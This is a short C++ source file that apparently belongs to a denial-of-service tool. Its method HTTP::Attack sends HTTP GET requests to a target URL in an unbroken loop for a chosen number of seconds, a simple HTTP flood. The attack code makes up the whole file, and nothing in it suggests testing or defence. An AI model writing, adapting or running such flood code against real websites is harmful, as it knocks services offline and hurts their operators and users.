#include "Methods/HTTP.h"

void HTTP::Attack(std::string url, int nDuration) {
	HTTPClient http { };
	time_t start_time = time(nullptr);

	/* Attack to the specified URL during the specified time. */
	while (true) {
		time_t end_time = time(nullptr);
		float elapsed_time = (float)end_time - (float)start_time;
		if (elapsed_time >= nDuration)
			break;
		
		http.GET(url, ADDR_TYPE::IPv4);
	}

	return;
}